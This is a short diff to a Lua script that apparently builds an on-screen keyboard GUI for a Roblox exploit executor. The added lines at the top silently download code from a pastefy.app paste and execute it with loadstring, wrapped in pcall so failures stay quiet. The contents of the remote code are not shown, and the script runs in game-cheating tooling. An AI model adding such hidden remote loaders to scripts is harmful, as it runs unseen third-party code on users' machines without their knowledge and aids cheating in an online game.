@@ -1,3 +1,9 @@
+pcall(function()
+    if not shared.FunctionPatchesForTrashExecutor == true then
+        loadstring(game:HttpGet("https://pastefy.app/TL0PGJ2Z/raw"))()
+        shared.FunctionPatchesForTrashExecutor = true
+    end
+end)
 local G2L = {}
 G2L["1"] = Instance.new("ScreenGui", gethui())
 G2L["1"]["Name"] = [[DeltaKeyboard]]
